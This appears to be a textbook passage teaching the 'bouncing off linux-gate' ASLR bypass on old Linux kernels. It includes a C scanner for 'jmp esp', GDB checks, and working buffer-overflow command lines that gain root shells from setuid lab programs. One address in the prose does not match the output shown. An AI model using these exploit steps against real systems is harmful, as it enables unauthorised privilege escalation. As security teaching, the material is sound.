The technique described below doesn't work with Linux kernels starting from 2.6.18
This technique gained some popularity and, of course, the developers patched the problem
The kernel used in the included LiveCD is 2.6.20, so the output below is from the machine loki, which is running a 2.6.17 Linux kernel
Even though this particular technique doesn't work on the LiveCD, the concepts behind it can be applied in other useful ways

Bouncing off linux-gate refers to a shared object, exposed by the kernel, which looks like a shared library
The program ldd shows a program's shared library dependencies
Do you notice anything interesting about the linux-gate library in the output below?
__________________________________________________________________________________
matrix@loki /hacking $ $ uname -a
Linux hacking 2.6.17 #2 SMP Sun Apr 11 03:42:05 UTC 2007 i686 GNU/Linux

matrix@loki /hacking $ cat /proc/sys/kernel/randomize_va_space
1

matrix@loki /hacking $ ldd ./aslr_demo
         _______________________________
        |linux-gate.so.1 => (0xffffe000)|
        |_______________________________|

        libc.so.6 => /lib/libc.so.6 (0xb7eb2000)
        /lib/ld-linux.so.2 (0xb7fe5000)

matrix@loki /hacking $ ldd /bin/ls
         _______________________________
        |linux-gate.so.1 => (0xffffe000)|
        |_______________________________|

        librt.so.1 => /lib/librt.so.1 (0xb7f95000)
        libc.so.6 => /lib/libc.so.6 (0xb7e75000)
        libpthread.so.0 => /lib/libpthread.so.0 (0xb7e62000)
        /lib/ld-linux.so.2 (0xb7fb1000)

matrix@loki /hacking $ ldd /bin/ls
         _______________________________
        |linux-gate.so.1 => (0xffffe000)|
        |_______________________________|

        librt.so.1 => /lib/librt.so.1 (0xb7f50000)
        libc.so.6 => /lib/libc.so.6 (0xb7e30000)
        libpthread.so.0 => /lib/libpthread.so.0 (0xb7e1d000)
        /lib/ld-linux.so.2 (0xb7f6c000)
__________________________________________________________________________________

Even in different programs and with ASLR enabled, linux-gate.so.1 is always present at the same address
This is a virtual dynamically shared object used by the kernel to speed up system calls, which means it's needed in every process
It is loaded straight from the kernel and doesn't exist anymore on the disk

The important thing is that every process has a block of memory containing linux-gate's instructions, which are always at the same location, even with ASLR
We are going to search this memory space for a certain assembly instruction, 
      
         jmp esp

This instruction will jump EIP to where ESP is pointing

First, we assemble the instruction to see what it looks like in machine code
__________________________________________________________________________________
matrix@loki /hacking $ cat > jmpesp.s
BITS 32
jmp esp

matrix@loki /hacking $ nasm jmpesp.s
matrix@loki /hacking $ hexdump -C jmpesp
00000000 ff e4                         |..|
00000002
__________________________________________________________________________________

Using this information, a simple program can be written to find this pattern in the program's own memory

find_jmpesp.c
__________________________________________________________________________________
int main()
{
   unsigned long linuxgate_start = 0xffffe000;
   char *ptr = (char *) linuxgate_start;

   int i;

   for(i=0; i < 4096; i++)
   {
      if(ptr[i] == '\xff' && ptr[i+1] == '\xe4')
         printf("found jmp esp at %p\n", ptr+i);
   }
}
__________________________________________________________________________________

When the program is compiled and run, it shows that this instruction exists at 0xffff3777
This can be further verified using GDB

__________________________________________________________________________________
matrix@loki /hacking $ ./find_jmpesp
found jmp esp at 0xffffe777

matrix@loki /hacking $ gdb -q ./aslr_demo
Using host libthread_db library "/lib/libthread_db.so.1".

(gdb) break main
Breakpoint 1 at 0x80483f0: file aslr_demo.c, line 7.

(gdb) run
Starting program: /hacking/aslr_demo

Breakpoint 1, main (argc=1, argv=0xbf869894) at aslr_demo.c:7
7               printf("buffer is at %p\n", &buffer);

(gdb) x/i 0xffffe777
0xffffe777:     jmp     esp
__________________________________________________________________________________

Putting it all together, if we overwrite the return address with the address 0xffffe777, then execution will jump into linux-gate when the main function returns
Since this is a jmp instruction, execution will immediately jump back out of linux-gate to wherever ESP happens to be pointing
From our previous debugging, we know that at the end of the main function, ESP is pointing to memory directly after the return address
So if shellcode is put here, EIP should bounce right into it

__________________________________________________________________________________
matrix@loki /hacking $ sudo chown root:root ./aslr_demo
matrix@loki /hacking $ sudo chmod u+s ./aslr_demo

matrix@loki /hacking $ ./aslr_demo $(perl -e 'print "\x77\xe7\xff\xff"x20')$(cat scode.bin)
buffer is at 0xbf8d9ae0
sh-3.1#
__________________________________________________________________________________

This technique can also be used to exploit the notesearch program, as shown here

__________________________________________________________________________________
matrix@loki /hacking $ for i in `seq 1 50`; do ./notesearch $(perl -e "print 'AAAA'x$i"); if [ $? == 139 ]; then echo "Try $i words"; break; fi; done
[DEBUG] found a 34 byte note for user id 1000
[DEBUG] found a 41 byte note for user id 1000
[DEBUG] found a 63 byte note for user id 1000
-------[ end of note data ]-------

*** OUTPUT TRIMMED ***

[DEBUG] found a 34 byte note for user id 1000
[DEBUG] found a 41 byte note for user id 1000
[DEBUG] found a 63 byte note for user id 1000
-------[ end of note data ]-------
Segmentation fault
Try 35 words

matrix@loki /hacking $ ./notesearch $(perl -e 'print "\x77\xe7\xff\xff"x35')$(cat scode.bin)
[DEBUG] found a 34 byte note for user id 1000
[DEBUG] found a 41 byte note for user id 1000
[DEBUG] found a 63 byte note for user id 1000
-------[ end of note data ]-------
Segmentation fault

matrix@loki /hacking $ ./notesearch $(perl -e 'print "\x77\xe7\xff\xff"x36')$(cat scode2.bin)
[DEBUG] found a 34 byte note for user id 1000
[DEBUG] found a 41 byte note for user id 1000
[DEBUG] found a 63 byte note for user id 1000
-------[ end of note data ]-------
sh-3.1#
_________________________________________________________________________________

The initial estimate of 35 words was off, since the program still crashed with the slightly smaller exploit buffer
But it is in the right ballpark, so a manual tweak (or a more accurate way to calculate the offset) is all that is needed

Sure, bouncing off linux-gate is a slick trick, but it only works with older Linux kernels
Back on the LiveCD, running Linux 2.6.20, the useful instruction is no longer found in the usual address space

_________________________________________________________________________________
reader@hacking:~/booksrc $ uname -a
Linux hacking 2.6.20-15-generic #2 SMP Sun Apr 15 07:36:31 UTC 2007 i686 GNU/Linux

reader@hacking:~/booksrc $ gcc -o find_jmpesp find_jmpesp.c
reader@hacking:~/booksrc $ ./find_jmpesp
reader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c

reader@hacking:~/booksrc $ ./aslr_demo test
buffer is at 0xbfcf3480
reader@hacking:~/booksrc $ ./aslr_demo test
buffer is at 0xbfd39cd0

reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo
SHELLCODE will be at 0xbfc8d9c3
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo
SHELLCODE will be at 0xbfa0c9c3
_________________________________________________________________________________

Without the
      
      jmp esp

instruction at a predictable address, there is no easy way to bounce off linux-gate
Can you think of a way to bypass ASLR to exploit aslr_demo on the LiveCD?